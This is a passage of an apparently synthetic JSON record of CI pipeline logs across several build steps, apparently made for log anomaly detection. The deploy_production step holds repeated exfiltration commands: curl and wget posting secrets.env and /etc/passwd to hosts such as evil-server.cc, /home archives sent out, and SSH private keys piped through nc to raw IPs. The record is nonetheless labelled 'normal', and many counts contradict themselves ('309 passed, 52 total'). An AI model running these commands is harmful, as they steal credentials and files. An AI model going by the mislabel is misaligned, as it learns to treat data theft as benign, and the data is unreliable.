          "[12:45:57] INFO: Connecting to database",
          "[12:45:57] WARN: Deprecated API usage",
          "yarn add: Done in 12.19s",
          "Step 3/23: Building",
          "Verifying...",
          "Environment: development",
          "[12:45:57] INFO: Connecting to database",
          "Processing...",
          "Fetching from https://githubusercontent.com/package.json",
          "Coverage: 75% statements, 87% branches",
          "yarn add: Done in 5.34s",
          "Exception: TypeError",
          "NODE_ENV=test",
          "WARNING: express has known vulnerabilities",
          "Step 13/19: Testing",
          "npm install: resolved 1039 packages",
          "Test Suites: 33 passed, 48 total",
          "Pulling image: python:3.11",
          "Waiting...",
          "\u2713 Step 'build' succeeded",
          "Time: 99.350s",
          "[12:45:57] WARN: Deprecated API usage",
          "WARNING: axios has known vulnerabilities",
          "Creating production build...",
          "Environment: development",
          "Loading...",
          "pip: Installing build dependencies...",
          "POST /upload - 201 (362ms)",
          "WARNING: webpack has known vulnerabilities",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-25T12:48:01.605504",
        "finished_at": "2025-11-25T12:48:42.962216",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Optimizing 36 modules...",
          "npm notice: package.json updated",
          "Success!",
          "[12:45:57] INFO: Cache refreshed",
          "Step 18/18: Deploying",
          "Connection established",
          "[12:45:57] DEBUG: Initializing service",
          "[12:45:57] INFO: Cache refreshed",
          "\u2713 Task completed in 2948ms",
          "  PASS: e2e/test_user_create.spec.js",
          "[12:45:57] ERROR: Connection failed",
          "npm notice: package.json updated",
          "  PASS: integration/test_db_connect.spec.js",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 All checks passed",
          "Time: 102.752s",
          "Checking out develop branch",
          "Compiling components/handler.rs...",
          "npm notice: package.json updated",
          "Finished.",
          "Done.",
          "OK",
          "Connection established",
          "Creating production build...",
          "Cache hit for key-6606",
          "WARNING: jest has known vulnerabilities",
          "[12:45:57] INFO: Request completed",
          "npm install: resolved 1108 packages",
          "Verifying...",
          "Platform: win32-x64",
          "Ran 60 tests in 14s",
          "\u2713 package completed",
          "Test Suites: 25 passed, 11 total",
          "Pushing to registry...",
          "Pushing to registry...",
          "Cache restored successfully (350MB)",
          "Artifact downloaded: 16MB",
          "Minifying main.js",
          "Snapshots: 13 passed, 30 total",
          "Waiting...",
          "Using Node.js 15.13.9",
          "WARNING: axios has known vulnerabilities",
          "Compiling utils/handler.rs...",
          "Time: 96.269s",
          "[12:45:57] DEBUG: Loading configuration",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache miss for key-2050",
          "[12:45:57] INFO: Request completed",
          "\u2717 build failed with exit code 72",
          "pip: Downloading prettier-5.15.tar.gz",
          "\u2717 build failed with exit code 115",
          "Finished.",
          "Ready.",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:45:57] DEBUG: Connection pool: 1 active",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing axios@4.11.10",
          "Ran 185 tests in 59s",
          "TLS handshake completed",
          "Verifying...",
          "TLS handshake completed",
          "pip: Downloading react-5.18.tar.gz",
          "Already up to date.",
          "Success!",
          "Pulling image: python:3.11",
          "POST /api - 201 (133ms)",
          "Completed.",
          "Finished.",
          "Creating production build...",
          "Using Node.js 18.18.3",
          "npm notice: package.json updated",
          "Transforming 326 files...",
          "Finished.",
          "[12:45:57] INFO: Processing request",
          "Optimizing 32 modules...",
          "Transforming 907 files...",
          "Uploading artifact 'build' (23 files)",
          "Step 4/21: Installing dependencies",
          "\u2717 build failed with exit code 35",
          "Done.",
          "Cache saved successfully",
          "POST /api - 200 (482ms)",
          "Compiling components/utils.go...",
          "Processing...",
          "[12:45:57] WARN: Deprecated API usage",
          "Finished.",
          "Pushing to registry...",
          "npm install: added 379 packages",
          "[12:45:57] WARN: Deprecated API usage",
          "Using Python 3.11",
          "POST /api - 202 (458ms)",
          "POST /api - 202 (489ms)",
          "FAILED: test_api_health",
          "Checking out main branch",
          "Step 20/20: Installing dependencies",
          "Step 2/16: Testing",
          "[12:45:57] DEBUG: Loading configuration",
          "[12:45:57] DEBUG: Initializing service",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-25T12:48:42.962216",
        "finished_at": "2025-11-25T12:48:55.369230",
        "log_lines": [
          "=== Step: save_cache ===",
          "Test Suites: 26 passed, 49 total",
          "[12:45:57] DEBUG: Initializing service",
          "Step 20/19: Deploying",
          "Platform: win32-x64",
          "Coverage: 82% statements, 64% branches",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling components/main.py...",
          "[12:45:57] INFO: Connecting to database",
          "[12:45:57] INFO: Request completed",
          "Exception: RuntimeError",
          "[12:45:57] INFO: Processing request",
          "Test Suites: 37 passed, 14 total",
          "[12:45:57] DEBUG: Connection pool: 9 active",
          "Step 3/21: Deploying",
          "Image pulled successfully",
          "Snapshots: 1 passed, 15 total",
          "  PASS: unit/test_api_health.spec.js",
          "Transforming 977 files...",
          "Snapshots: 30 passed, 27 total",
          "Optimizing 87 modules...",
          "Time: 90.702s",
          "Checking out main branch",
          "Installing express@1.8.6",
          "Pushing to registry...",
          "Step 9/22: Running migrations",
          "Pulling image: alpine:3.11",
          "  PASS: test_cache_hit (114ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Success!",
          "Ran 55 tests in 31s",
          "Building Docker image...",
          "Transforming 593 files...",
          "OK",
          "TLS handshake completed",
          "Building Docker image...",
          "Ran 164 tests in 29s",
          "Creating production build...",
          "Step 12/19: Building",
          "Using Python 3.9",
          "Environment: development",
          "\u2713 Task completed in 3300ms",
          "Ready.",
          "POST /upload - 200 (344ms)",
          "Already up to date.",
          "Generating source maps...",
          "Cache restored successfully (392MB)",
          "WARNING: axios has known vulnerabilities",
          "Platform: linux-x64",
          "Step 5/23: Linting",
          "Environment: test",
          "Platform: win32-x64",
          "Step 2/19: Running migrations",
          "Cache hit for key-8960",
          "Uploading artifact 'coverage' (12 files)",
          "[12:45:57] WARN: Deprecated API usage",
          "[12:45:57] DEBUG: Loading configuration",
          "[12:45:57] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Step 18/24: Installing dependencies",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Optimizing 54 modules...",
          "GET /api - 201 (70ms)",
          "Image pulled successfully",
          "pip: Collecting lodash",
          "Optimizing 66 modules...",
          "yarn add: Done in 10.8s",
          "Verifying...",
          "Pushing to registry...",
          "Exception: RuntimeError",
          "WARNING: express has known vulnerabilities",
          "[12:45:57] DEBUG: Connection pool: 10 active",
          "Finished.",
          "Installing express@4.4.7",
          "pip install: Successfully installed axios-4.1",
          "[12:45:57] DEBUG: Connection pool: 5 active",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:45:57] DEBUG: Query executed in 56ms",
          "[12:45:57] WARN: Deprecated API usage",
          "pip install: Successfully installed axios-2.10",
          "[12:45:57] WARN: Deprecated API usage",
          "NODE_ENV=production",
          "npm notice: package.json updated",
          "Verifying...",
          "Snapshots: 27 passed, 37 total",
          "Cache restored successfully (452MB)",
          "pip install: Successfully installed jest-5.11",
          "[12:45:57] DEBUG: Query executed in 60ms",
          "Tests: 309 passed, 52 total",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "npm notice: created a lockfile",
          "Ran 142 tests in 50s",
          "[12:45:57] WARN: Deprecated API usage",
          "Step 6/25: Deploying",
          "Step 1/16: Linting",
          "Cache invalidated: build",
          "\u2713 package completed",
          "Artifact uploaded: dist.zip (86MB)",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-25T12:48:55.369230",
        "finished_at": "2025-11-25T12:49:16.047586",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "\u2713 build completed",
          "GET /api - 201 (59ms)",
          "Pushing to registry...",
          "Fetching from https://npmjs.org/package.json",
          "Platform: darwin-arm64",
          "Step 18/18: Installing dependencies",
          "WARNING: eslint has known vulnerabilities",
          "[12:45:57] DEBUG: Initializing service",
          "Cache saved successfully",
          "[12:45:57] DEBUG: Loading configuration",
          "TLS handshake completed",
          "Loading...",
          "[12:45:57] DEBUG: Initializing service",
          "Loading...",
          "WARNING: eslint has known vulnerabilities",
          "pip: Downloading jest-3.8.tar.gz",
          "POST /api - 202 (53ms)",
          "Ran 188 tests in 39s",
          "Done.",
          "\u2717 build failed with exit code 105",
          "Pushing to registry...",
          "pip: Collecting prettier",
          "Fetching from https://githubusercontent.com/package.json",
          "Compiling src/app.ts...",
          "Exception: RuntimeError",
          "Ready.",
          "pip: Collecting jest",
          "Step 16/22: Building",
          "Optimizing 25 modules...",
          "Using Python 3.11",
          "[12:45:57] INFO: Processing request",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "Switched to branch 'feature/task-994'",
          "Time: 75.216s",
          "Connection established",
          "[12:45:57] DEBUG: Loading configuration",
          "Cache miss for key-6086",
          "FAILED: test_db_connect",
          "[12:45:57] DEBUG: Query executed in 69ms",
          "\u2713 build completed",
          "[12:45:57] WARN: Deprecated API usage",
          "Compiling utils/handler.rs...",
          "Minifying main.js",
          "\u2717 build failed with exit code 102",
          "Step 12/16: Linting",
          "[12:45:57] DEBUG: Initializing service",
          "\u2713 Step 'setup' succeeded",
          "Image pulled successfully",
          "Test Suites: 49 passed, 35 total",
          "Using Python 3.12",
          "\u2713 package completed",
          "Cache restored successfully (52MB)",
          "Ran 162 tests in 32s",
          "Uploading artifact 'coverage' (19 files)",
          "Step 18/24: Building",
          "Ran 22 tests in 44s",
          "Checking out main branch",
          "GET /api - 200 (36ms)",
          "Step 6/19: Installing dependencies",
          "[12:45:57] INFO: Connecting to database",
          "Platform: linux-x64",
          "Coverage: 73% statements, 63% branches",
          "Success!",
          "npm install: added 327 packages",
          "HEAD is now at 8b65289",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:45:57] DEBUG: Connection pool: 7 active",
          "Switched to branch 'feature/task-239'",
          "[12:45:57] DEBUG: Query executed in 45ms",
          "Loading...",
          "NODE_ENV=development",
          "Processing...",
          "TLS handshake completed",
          "TLS handshake completed",
          "pip: Downloading prettier-5.19.tar.gz",
          "[12:45:57] INFO: Starting build process",
          "Minifying vendor.js",
          "POST /data - 201 (191ms)",
          "[12:45:57] DEBUG: Initializing service",
          "Done.",
          "Waiting...",
          "[12:45:57] INFO: Connecting to database",
          "WARNING: react has known vulnerabilities",
          "Tests: 125 passed, 267 total",
          "Ran 111 tests in 28s",
          "Artifact uploaded: build.tar.gz (29MB)",
          "pip install: Successfully installed webpack-2.16",
          "Time: 2.15s",
          "Test Suites: 30 passed, 11 total",
          "WARNING: lodash has known vulnerabilities",
          "Ready.",
          "Fetching from https://googleapis.com/package.json",
          "Cache invalidated: node_modules",
          "Done.",
          "[12:45:57] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "pip install: Successfully installed react-2.5",
          "[12:45:57] INFO: Request completed",
          "Loading...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-25T12:49:16.047586",
        "finished_at": "2025-11-25T12:49:36.725942",
        "log_lines": [
          "=== Step: type_check ===",
          "[12:45:57] INFO: Connecting to database",
          "pip install: Successfully installed jest-4.12",
          "[12:45:57] INFO: Request completed",
          "Bundling styles.css",
          "HEAD is now at 909f623",
          "Compiling lib/main.py...",
          "[12:45:57] WARN: Deprecated API usage",
          "Test Suites: 13 passed, 36 total",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Cache miss for key-5335",
          "pip: Downloading react-4.10.tar.gz",
          "  PASS: test_api_health (481ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:45:57] INFO: Request completed",
          "npm notice: package.json updated",
          "Step 6/22: Deploying",
          "Platform: win32-x64",
          "POST /data - 201 (97ms)",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Cache miss for key-2797",
          "\u2713 Step 'install' succeeded",
          "TLS handshake completed",
          "Ready.",
          "OK",
          "Cache invalidated: build",
          "[12:45:57] INFO: Connecting to database",
          "\u2717 build failed with exit code 65",
          "Cache invalidated: build",
          "Verifying...",
          "POST /data - 201 (375ms)",
          "Cache miss for key-7810",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 12/20: Running migrations",
          "Compiling components/handler.rs...",
          "Loading...",
          "Compiling lib/service.java...",
          "Time: 44.421s",
          "npm notice: package.json updated",
          "[12:45:57] WARN: Deprecated API usage",
          "Step 15/16: Installing dependencies",
          "Ran 89 tests in 36s",
          "WARNING: lodash has known vulnerabilities",
          "Step 2/21: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Generating source maps...",
          "Fetching submodules...",
          "Installing react@4.15.0",
          "Step 10/22: Running migrations",
          "[12:45:57] ERROR: Connection failed",
          "Cache miss for key-1301",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Ran 36 tests in 36s",
          "[12:45:57] DEBUG: Loading configuration",
          "Bundling vendor.js",
          "WARNING: axios has known vulnerabilities",
          "Image pulled successfully",
          "Artifact downloaded: 14MB",
          "FAILED: test_auth_login",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Checking out master branch",
          "Step 10/20: Building",
          "[12:45:57] DEBUG: Initializing service",
          "npm install: resolved 575 packages",
          "[12:45:57] INFO: Cache refreshed",
          "Cache miss for key-3390",
          "Completed.",
          "Generating source maps...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache invalidated: build",
          "pip install: Successfully installed express-4.20",
          "Uploading artifact 'build' (11 files)",
          "Step 13/20: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (42MB)",
          "npm notice: created a lockfile",
          "[12:45:57] INFO: Cache refreshed",
          "Environment: production",
          "Time: 104.74s",
          "Step 5/20: Testing",
          "Checking out master branch",
          "Test Suites: 33 passed, 35 total",
          "Compiling src/service.java...",
          "yarn add: Done in 5.5s",
          "Already up to date.",
          "Minifying vendor.js",
          "[12:45:57] ERROR: Connection failed",
          "[12:45:57] INFO: Request completed",
          "\u2713 validate completed",
          "Completed.",
          "Creating production build...",
          "[12:45:57] INFO: Processing request",
          "Compiling utils/index.js...",
          "npm install: resolved 1916 packages",
          "NODE_ENV=development",
          "\u2717 build failed with exit code 31",
          "Cache saved successfully",
          "[12:45:57] DEBUG: Initializing service",
          "Waiting...",
          "WARNING: express has known vulnerabilities",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-25T12:49:36.725942",
        "finished_at": "2025-11-25T12:49:44.997284",
        "log_lines": [
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "=== Step: deploy_production ===",
          "  PASS: test_db_connect (427ms)",
          "Exception: TypeError",
          "Image pulled successfully",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Done.",
          "Verifying...",
          "Bundling main.js",
          "[12:45:57] INFO: Processing request",
          "Artifact downloaded: 21MB",
          "npm notice: package.json updated",
          "Compiling src/index.js...",
          "Step 7/16: Running migrations",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Uploading artifact 'dist' (1 files)",
          "[12:45:57] INFO: Starting build process",
          "Cache invalidated: build",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Optimizing 64 modules...",
          "Pulling image: alpine:latest",
          "Uploading artifact 'coverage' (21 files)",
          "OK",
          "[12:45:57] DEBUG: Loading configuration",
          "[12:45:57] ERROR: Connection failed",
          "Processing...",
          "Transforming 649 files...",
          "Processing...",
          "Cache saved successfully",
          "Using Node.js 15.3.0",
          "Checking out master branch",
          "Done.",
          "Step 5/15: Testing",
          "Using Python 3.12",
          "Already up to date.",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Installing prettier@5.8.6",
          "TLS handshake completed",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "[12:45:57] DEBUG: Memory usage: 976MB",
          "[12:45:57] INFO: Request completed",
          "Step 12/22: Running migrations",
          "\u2713 lint completed",
          "Optimizing 26 modules...",
          "Done.",
          "[12:45:57] DEBUG: Memory usage: 379MB",
          "Already up to date.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 211.113.167.172 59599",
          "TLS handshake completed",
          "[12:45:57] ERROR: Connection failed",
          "POST /upload - 201 (358ms)",
          "Generating source maps...",
          "  PASS: test_cache_hit (101ms)",
          "Optimizing 89 modules...",
          "Compiling lib/handler.rs...",
          "Finished.",
          "Checking out develop branch",
          "Building Docker image...",
          "Cache restored successfully (142MB)",
          "Compiling src/utils.go...",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "WARNING: lodash has known vulnerabilities",
          "Bundling vendor.css",
          "Transforming 151 files...",
          "Image pulled successfully",
          "Cache restored successfully (253MB)",
          "[12:45:57] INFO: Cache refreshed",
          "Tests: 380 passed, 190 total",
          "\u2713 deploy completed",
          "Using Node.js 20.20.2",
          "Artifact downloaded: 26MB",
          "Minifying main.js",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Checking out develop branch",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 18/22: Testing",
          "\u2717 build failed with exit code 49",
          "Checking out master branch",
          "npm install: added 333 packages",
          "Cache invalidated: build",
          "Coverage: 93% statements, 96% branches",
          "[12:45:57] DEBUG: Connection pool: 6 active",
          "WARNING: webpack has known vulnerabilities",
          "HEAD is now at 952b6bc",
          "[12:45:57] INFO: Processing request",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Verifying...",
          "Using Python 3.11",
          "[12:45:57] DEBUG: Loading configuration",
          "Finished.",
          "npm install: added 293 packages",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 59.52.175.191 17636",
          "Finished.",
          "npm install: resolved 1570 packages",
          "Cache saved successfully",
          "Snapshots: 31 passed, 13 total",
          "HEAD is now at 3817a4e",
          "[12:45:57] INFO: Connecting to database",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 67.173.111.249 23765",
          "npm notice: package.json updated",
          "Done.",
          "Step 19/18: Testing",
          "Already up to date.",
          "  PASS: unit/test_db_connect.spec.js",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 171.120.159.165 38983",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 165.248.253.180 53407",
          "  PASS: test_user_create (441ms)",
          "Generating source maps...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 132.227.121.192 50704",
          "npm install: added 173 packages",
          "Verifying...",
          "Using Node.js 14.0.9",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "Switched to branch 'bugfix/task-334'",
          "Done.",
          "Exception: RuntimeError",
          "[12:45:57] DEBUG: Memory usage: 528MB",
          "Completed.",
          "=== Step deploy_production completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}